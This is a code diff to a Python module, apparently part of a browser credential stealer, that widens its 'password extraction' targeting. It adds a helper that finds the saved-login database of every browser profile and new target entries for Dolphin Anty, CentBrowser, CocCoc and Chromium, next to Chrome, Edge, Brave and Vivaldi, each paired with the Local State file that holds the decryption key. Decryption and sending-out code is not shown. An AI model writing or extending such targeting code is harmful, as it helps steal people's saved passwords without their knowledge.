@@ -35,26 +35,52 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 logger = logging.getLogger(__name__)
 
 # Browser configurations for password extraction
+def _get_all_profile_login_data(base_path: Path) -> list[Path]:
+    """Get Login Data paths for all profiles in a browser."""
+    paths = []
+    user_data = base_path.parent if base_path.name == "Default" else base_path
+    if not user_data.exists():
+        return paths
+    
+    # Default profile
+    default_login = user_data / "Default" / "Login Data"
+    if default_login.exists():
+        paths.append(default_login)
+    
+    # Numbered profiles (Profile 1, Profile 2, etc.)
+    try:
+        for item in user_data.iterdir():
+            if item.is_dir() and item.name.startswith("Profile "):
+                login_data = item / "Login Data"
+                if login_data.exists():
+                    paths.append(login_data)
+    except Exception:
+        pass
+    
+    return paths
+
+
+# Browser configurations for password extraction
 BROWSER_PASSWORD_CONFIG = {
     "chrome": {
         "name": "Google Chrome",
-        "login_data_paths": [
-            Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data",
-        ],
+        "login_data_paths": _get_all_profile_login_data(
+            Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default"
+        ) or [Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"],
         "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Local State",
     },
     "edge": {
         "name": "Microsoft Edge",
-        "login_data_paths": [
-            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Login Data",
-        ],
+        "login_data_paths": _get_all_profile_login_data(
+            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default"
+        ) or [Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Login Data"],
         "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Local State",
     },
     "brave": {
         "name": "Brave Browser",
-        "login_data_paths": [
-            Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Login Data",
-        ],
+        "login_data_paths": _get_all_profile_login_data(
+            Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default"
+        ) or [Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Login Data"],
         "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Local State",
     },
     "opera": {
@@ -73,10 +99,39 @@ BROWSER_PASSWORD_CONFIG = {
     },
     "vivaldi": {
         "name": "Vivaldi",
-        "login_data_paths": [
-            Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data" / "Default" / "Login Data",
-        ],
+        "login_data_paths": _get_all_profile_login_data(
+            Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data" / "Default"
+        ) or [Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data" / "Default" / "Login Data"],
         "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data" / "Local State",
+    },
+    "dolphin_anty": {
+        "name": "Dolphin Anty",
+        "login_data_paths": [
+            Path(os.environ.get("LOCALAPPDATA", "")) / "AntBrowser" / "browser-profiles" / "Default" / "Login Data",
+            Path(os.environ.get("APPDATA", "")) / "AntBrowser" / "browser-profiles" / "Default" / "Login Data",
+        ],
+        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "AntBrowser" / "Local State",
+    },
+    "cent_browser": {
+        "name": "CentBrowser",
+        "login_data_paths": _get_all_profile_login_data(
+            Path(os.environ.get("LOCALAPPDATA", "")) / "CentBrowser" / "User Data" / "Default"
+        ) or [Path(os.environ.get("LOCALAPPDATA", "")) / "CentBrowser" / "User Data" / "Default" / "Login Data"],
+        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "CentBrowser" / "User Data" / "Local State",
+    },
+    "coccoc": {
+        "name": "CocCoc Browser",
+        "login_data_paths": [
+            Path(os.environ.get("LOCALAPPDATA", "")) / "CocCoc" / "Browser" / "User Data" / "Default" / "Login Data",
+        ],
+        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "CocCoc" / "Browser" / "User Data" / "Local State",
+    },
+    "chromium": {
+        "name": "Chromium",
+        "login_data_paths": _get_all_profile_login_data(
+            Path(os.environ.get("LOCALAPPDATA", "")) / "Chromium" / "User Data" / "Default"
+        ) or [Path(os.environ.get("LOCALAPPDATA", "")) / "Chromium" / "User Data" / "Default" / "Login Data"],
+        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) / "Chromium" / "User Data" / "Local State",
     },
 }
 
